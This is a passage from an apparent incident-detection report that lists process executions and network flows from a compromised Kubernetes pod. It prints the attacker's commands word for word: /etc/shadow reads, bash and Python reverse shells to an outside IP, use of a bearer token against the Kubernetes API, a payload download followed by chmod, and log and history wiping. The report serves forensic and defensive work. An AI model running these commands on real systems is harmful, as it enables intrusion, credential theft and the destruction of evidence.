**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgzODAzNDM4NTk0NTA6OTQzMDc0`

**Command (x1):**
```bash
/bin/sh -c id
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:52:56.176000 - 08:54:36.707000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 74 | RELATED |
| 08:54:10.768000 - 08:54:49.840000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 16 | RELATED |
| 08:54:10.769000 - 08:54:49.839000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 10 | RELATED |
| 08:52:56.784000 - 08:54:36.707000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 7 | RELATED |
| 08:53:29.917000 - 08:54:10.766000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45626 | 6 | RELATED |
| 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 1 | RELATED |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |
| 08:53:29.924000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:60297 | 1 | RELATED |
| 08:53:36.717000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:63092 | 1 | RELATED |

<details><summary>View 1 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:54:10.767000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64731 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgzODAzNDM4NTk0NTA6OTQzMDc0';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:50:56.780194' AND '2026-01-30 08:54:56.780194' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 13. [CORRELATED] 08:53:03.904422
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTgzODc0NjgwODc3MTA6OTQzMDgz`

**Command (x1):**
```bash
/bin/sh -c env
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:52:56.176000 - 08:54:36.707000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 74 | RELATED |
| 08:54:10.768000 - 08:54:58.386000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 18 | RELATED |
| 08:54:10.769000 - 08:54:58.385000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 12 | RELATED |
| 08:52:56.784000 - 08:54:36.707000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 7 | RELATED |
| 08:54:58.460000 - 08:54:58.486000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:192.168.100.10:6443 | 7 | RELATED |
| 08:53:29.917000 - 08:54:10.766000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45626 | 6 | RELATED |
| 08:54:58.460000 - 08:54:58.486000 | EXTERNAL:192.168.100.10 -> web-service-548d6dcdf6-2ztpn:46748 | 3 | RELATED |
| 08:52:56.177000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:33070 | 1 | RELATED |
| 08:52:56.784000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45590 | 1 | RELATED |
| 08:53:03.906000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:53438 | 1 | RELATED |

<details><summary>View 3 more flows...</summary>

| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:53:29.924000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:60297 | 1 | RELATED |
| 08:53:36.717000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:63092 | 1 | RELATED |
| 08:54:10.767000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64731 | 1 | RELATED |

</details>

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTgzODc0NjgwODc3MTA6OTQzMDgz';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:51:03.904422' AND '2026-01-30 08:55:03.904422' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 14. [CORRELATED] 08:53:29.921472
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg0MTM0ODYwMTY5NDI6OTQzMTEw`

**Command (x1):**
```bash
/bin/sh -c "cat /etc/passwd"
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:53:29.915000 - 08:55:10.750000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 44 | RELATED |
| 08:54:10.768000 - 08:55:05.163000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 20 | RELATED |
| 08:54:10.769000 - 08:55:05.162000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 14 | RELATED |
| 08:53:29.917000 - 08:55:10.750000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45626 | 7 | RELATED |
| 08:54:58.460000 - 08:54:58.486000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:192.168.100.10:6443 | 7 | RELATED |
| 08:53:36.716000 - 08:54:36.707000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 3 | RELATED |
| 08:54:58.460000 - 08:54:58.486000 | EXTERNAL:192.168.100.10 -> web-service-548d6dcdf6-2ztpn:46748 | 3 | RELATED |
| 08:53:29.924000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:60297 | 1 | RELATED |
| 08:53:36.717000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:63092 | 1 | RELATED |
| 08:54:10.767000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64731 | 1 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg0MTM0ODYwMTY5NDI6OTQzMTEw';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:51:29.921472' AND '2026-01-30 08:55:29.921472' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 15. [CORRELATED] 08:53:36.713773
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg0MjAyNzgzMTY4MjQ6OTQzMTE1`

**Command (x1):**
```bash
/bin/sh -c "cat /etc/shadow"
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:53:29.915000 - 08:55:10.750000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 44 | RELATED |
| 08:54:10.768000 - 08:55:05.163000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 20 | RELATED |
| 08:54:10.769000 - 08:55:05.162000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 14 | RELATED |
| 08:53:29.917000 - 08:55:10.750000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45626 | 7 | RELATED |
| 08:54:58.460000 - 08:54:58.486000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:192.168.100.10:6443 | 7 | RELATED |
| 08:53:36.716000 - 08:54:36.707000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 3 | RELATED |
| 08:54:58.460000 - 08:54:58.486000 | EXTERNAL:192.168.100.10 -> web-service-548d6dcdf6-2ztpn:46748 | 3 | RELATED |
| 08:53:29.924000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:60297 | 1 | RELATED |
| 08:53:36.717000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:63092 | 1 | RELATED |
| 08:54:10.767000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:64731 | 1 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg0MjAyNzgzMTY4MjQ6OTQzMTE1';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:51:36.713773' AND '2026-01-30 08:55:36.713773' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 16. [CONFIRMED] 08:54:10.763857
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg0NTQzMjg0MDA5NzY6OTQzMTQ4`

**Command (x1):**
```bash
/bin/sh -c "nohup bash -c 'bash -i >& /dev/tcp/172.30.164.116/4445 0>&1' > /dev/null 2>&1 &"
```

**Artifacts:** `172.30.164.116`

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:54:10.768000 - 08:55:53.606000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445** | 21 | CONFIRMED |
| 08:54:10.769000 - 08:55:53.606000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574** | 15 | CONFIRMED |
| 08:55:53.609000 - 08:55:58.912000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:5555** | 5 | CONFIRMED |
| 08:55:53.609000 - 08:55:58.912000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:36268** | 2 | CONFIRMED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg0NTQzMjg0MDA5NzY6OTQzMTQ4';
-- Network Check (Confirmed)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:52:10.763857' AND '2026-01-30 08:56:10.763857' AND (dest_ip IN ('172.30.164.116') OR src_ip IN ('172.30.164.116'));
```

---
## 17. [CONFIRMED] 08:54:10.765006
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg0NTQzMjk1NTAyNDY6OTQzMTQ5`

**Command (x1):**
```bash
/usr/bin/nohup bash -c "bash -i >& /dev/tcp/172.30.164.116/4445 0>&1"
```

**Artifacts:** `172.30.164.116`

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:54:10.768000 - 08:55:53.606000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445** | 21 | CONFIRMED |
| 08:54:10.769000 - 08:55:53.606000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574** | 15 | CONFIRMED |
| 08:55:53.609000 - 08:55:58.912000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:5555** | 5 | CONFIRMED |
| 08:55:53.609000 - 08:55:58.912000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:36268** | 2 | CONFIRMED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg0NTQzMjk1NTAyNDY6OTQzMTQ5';
-- Network Check (Confirmed)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:52:10.765006' AND '2026-01-30 08:56:10.765006' AND (dest_ip IN ('172.30.164.116') OR src_ip IN ('172.30.164.116'));
```

---
## 18. [CONFIRMED] 08:54:10.767234
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg0NTQzMzE3NzgwMzQ6OTQzMTQ5`

**Command (x1):**
```bash
/bin/bash -c "bash -i >& /dev/tcp/172.30.164.116/4445 0>&1"
```

**Artifacts:** `172.30.164.116`

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:54:10.768000 - 08:55:53.606000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445** | 21 | CONFIRMED |
| 08:54:10.769000 - 08:55:53.606000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574** | 15 | CONFIRMED |
| 08:55:53.609000 - 08:55:58.912000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:5555** | 5 | CONFIRMED |
| 08:55:53.609000 - 08:55:58.912000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:36268** | 2 | CONFIRMED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg0NTQzMzE3NzgwMzQ6OTQzMTQ5';
-- Network Check (Confirmed)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:52:10.767234' AND '2026-01-30 08:56:10.767234' AND (dest_ip IN ('172.30.164.116') OR src_ip IN ('172.30.164.116'));
```

---
## 19. [CORRELATED] 08:54:35.337385
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg0Nzg5MTU0NDQwNjI6OTQzMTc1`

**Command (x1):**
```bash
/bin/ln -sf /dev/null /root/.bash_history
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:54:28.975000 - 08:55:53.606000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 11 | RELATED |
| 08:54:28.975000 - 08:55:53.606000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 11 | RELATED |
| 08:54:58.460000 - 08:54:58.486000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:192.168.100.10:6443 | 7 | RELATED |
| 08:55:53.609000 - 08:55:58.912000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:5555 | 5 | RELATED |
| 08:54:36.706000 - 08:55:10.750000 | EXTERNAL:10.244.1.195 -> web-service-548d6dcdf6-2ztpn:3443 | 4 | RELATED |
| 08:54:58.460000 - 08:54:58.486000 | EXTERNAL:192.168.100.10 -> web-service-548d6dcdf6-2ztpn:46748 | 3 | RELATED |
| 08:55:53.609000 - 08:55:58.912000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:36268 | 2 | RELATED |
| 08:54:36.707000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:38682 | 1 | RELATED |
| 08:55:10.750000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:10.244.1.195:45626 | 1 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg0Nzg5MTU0NDQwNjI6OTQzMTc1';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:52:35.337385' AND '2026-01-30 08:56:35.337385' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 20. [CONFIRMED] 08:55:53.607815
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg1NTcxNzU1ODM1NTk6OTQzMjY4`

**Command (x1):**
```bash
/usr/bin/nc Exec ID   : azhzLXdvcmtlcjo3MTg1NTcxNzU1ODM1NTk6OTQzMjY4
```

**Artifacts:** `172.30.164.116`

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:55:53.606000 - 08:57:50.020000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574** | 5 | CONFIRMED |
| 08:55:53.606000 - 08:57:50.020000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445** | 5 | CONFIRMED |
| 08:55:53.609000 - 08:55:58.912000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:5555** | 5 | CONFIRMED |
| 08:55:53.609000 - 08:55:58.912000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:36268** | 2 | CONFIRMED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg1NTcxNzU1ODM1NTk6OTQzMjY4';
-- Network Check (Confirmed)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:53:53.607815' AND '2026-01-30 08:57:53.607815' AND (dest_ip IN ('172.30.164.116') OR src_ip IN ('172.30.164.116'));
```

---
## 21. [CORRELATED] 08:57:50.657370
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg2NzQyNDA2NDkyMTY6OTQzMzgz`

**Command (x1):**
```bash
/usr/bin/curl -k -s -H "Authorization: Bearer web-to-backend-token-777" https://kubernetes.default.svc/api/v1/pods
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:57:50.020000 - 08:59:26.829000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 10 | RELATED |
| 08:57:50.020000 - 08:59:26.829000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 10 | RELATED |
| 08:57:50.674000 - 08:57:50.689000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:192.168.100.10:6443 | 7 | RELATED |
| 08:58:06.159000 - 08:58:11.611000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:7777 | 5 | RELATED |
| 08:59:17.218000 - 08:59:17.281000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:8000 | 5 | RELATED |
| 08:57:50.675000 - 08:57:50.689000 | EXTERNAL:192.168.100.10 -> web-service-548d6dcdf6-2ztpn:46096 | 3 | RELATED |
| 08:59:17.219000 - 08:59:17.281000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:34084 | 3 | RELATED |
| 08:58:06.159000 - 08:58:11.611000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:57220 | 2 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg2NzQyNDA2NDkyMTY6OTQzMzgz';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:55:50.657370' AND '2026-01-30 08:59:50.657370' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 22. [CONFIRMED] 08:58:06.158562
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg2ODk3NDE4NDQxMjc6OTQzMzk3`

**Command (x1):**
```bash
/usr/bin/nc Exec ID   : azhzLXdvcmtlcjo3MTg2ODk3NDE4NDQxMjc6OTQzMzk3
```

**Artifacts:** `172.30.164.116`

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:58:06.156000 - 08:59:26.829000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574** | 8 | CONFIRMED |
| 08:58:06.157000 - 08:59:26.829000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445** | 8 | CONFIRMED |
| 08:58:06.159000 - 08:58:11.611000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:7777** | 5 | CONFIRMED |
| 08:59:17.218000 - 08:59:17.281000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:8000** | 5 | CONFIRMED |
| 08:59:17.219000 - 08:59:17.281000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:34084** | 3 | CONFIRMED |
| 08:58:06.159000 - 08:58:11.611000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:57220** | 2 | CONFIRMED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg2ODk3NDE4NDQxMjc6OTQzMzk3';
-- Network Check (Confirmed)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:56:06.158562' AND '2026-01-30 09:00:06.158562' AND (dest_ip IN ('172.30.164.116') OR src_ip IN ('172.30.164.116'));
```

---
## 23. [CONFIRMED] 08:59:17.213647
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg3NjA3OTc0MzI5Njg6OTQzNDY0`

**Command (x1):**
```bash
/usr/bin/curl -O http://172.30.164.116:8000/mysql_static
```

**Artifacts:** `172.30.164.116`

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:59:17.212000 - 09:01:09.399000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574** | 6 | CONFIRMED |
| 08:59:17.212000 - 09:01:09.400000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445** | 6 | CONFIRMED |
| 08:59:17.218000 - 08:59:17.281000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:8000** | 5 | CONFIRMED |
| 08:59:17.219000 - 08:59:17.281000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:34084** | 3 | CONFIRMED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg3NjA3OTc0MzI5Njg6OTQzNDY0';
-- Network Check (Confirmed)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:57:17.213647' AND '2026-01-30 09:01:17.213647' AND (dest_ip IN ('172.30.164.116') OR src_ip IN ('172.30.164.116'));
```

---
## 24. [CORRELATED] 08:59:26.831053
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg3NzA0MjM3NTk4NzU6OTQzNDc3`

**Command (x1):**
```bash
/bin/chmod +x mysql_static
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 08:59:17.212000 - 09:01:09.399000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 6 | RELATED |
| 08:59:17.212000 - 09:01:09.400000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 6 | RELATED |
| 08:59:17.218000 - 08:59:17.281000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:8000 | 5 | RELATED |
| 08:59:17.219000 - 08:59:17.281000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:34084 | 3 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg3NzA0MjM3NTk4NzU6OTQzNDc3';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:57:26.831053' AND '2026-01-30 09:01:26.831053' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 25. [CONFIRMED] 09:01:32.560182
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg4OTYxNTMwNzg4NDg6OTQzODAy`

**Command (x1):**
```bash
/usr/bin/nc Exec ID   : azhzLXdvcmtlcjo3MTg4OTYxNTMwNzg4NDg6OTQzODAy
```

**Artifacts:** `10.244.1.123`

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 09:01:32.561000 - 09:01:32.563000 | **web-service-548d6dcdf6-2ztpn -> service-db-6cdf7fd55-bz5g7:3306** | 6 | CONFIRMED |
| 09:01:32.561000 - 09:01:32.563000 | **service-db-6cdf7fd55-bz5g7 -> web-service-548d6dcdf6-2ztpn:39736** | 2 | CONFIRMED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg4OTYxNTMwNzg4NDg6OTQzODAy';
-- Network Check (Confirmed)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:59:32.560182' AND '2026-01-30 09:03:32.560182' AND (dest_ip IN ('10.244.1.123') OR src_ip IN ('10.244.1.123'));
```

---
## 26. [CORRELATED] 09:01:45.379663
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg5MDg5NzI1NjA5MTQ6OTQzODEx`

**Command (x1):**
```bash
/usr/bin/truncate -s 0 /var/log/syslog
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 09:01:45.375000 - 09:03:25.916000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 14 | RELATED |
| 09:01:45.378000 - 09:03:25.916000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 14 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg5MDg5NzI1NjA5MTQ6OTQzODEx';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:59:45.379663' AND '2026-01-30 09:03:45.379663' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 27. [CORRELATED] 09:01:53.057678
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg5MTY2NTA1NzU0OTI6OTQzODIy`

**Command (x1):**
```bash
/usr/bin/truncate -s 0 /var/log/auth.log
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 09:01:45.375000 - 09:03:25.916000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 14 | RELATED |
| 09:01:45.378000 - 09:03:25.916000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 14 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg5MTY2NTA1NzU0OTI6OTQzODIy';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:59:53.057678' AND '2026-01-30 09:03:53.057678' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 28. [CORRELATED] 09:01:59.789941
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg5MjMzODI4Mzg4NjQ6OTQzODI3`

**Command (x1):**
```bash
/usr/bin/truncate -s 0 /var/log/messages
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 09:01:53.056000 - 09:03:57.508000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 13 | RELATED |
| 09:01:53.057000 - 09:03:57.511000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 13 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg5MjMzODI4Mzg4NjQ6OTQzODI3';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 08:59:59.789941' AND '2026-01-30 09:03:59.789941' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 29. [CORRELATED] 09:02:20.439346
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTg5NDQwMzIyNDM5Nzk6OTQzODQ5`

**Command (x1):**
```bash
/bin/rm -rf /var/log/syslog
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 09:02:13.548000 - 09:03:57.508000 | EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574 | 7 | RELATED |
| 09:02:13.548000 - 09:03:57.511000 | web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445 | 7 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTg5NDQwMzIyNDM5Nzk6OTQzODQ5';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 09:00:20.439346' AND '2026-01-30 09:04:20.439346' AND (src_pod LIKE '%web%' OR dest_pod LIKE '%web%');
```

---
## 30. [CONFIRMED] 09:03:57.513371
**Pod:** `web-service-548d6dcdf6-2ztpn`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTkwNDExMDQwNzEwNzI6OTQzOTQy`

**Command (x1):**
```bash
/usr/bin/curl -m 1 -G --data-urlencode "c=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.30.164.116",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'" http://10.244.1.60:8080/api/debug/cmd
```

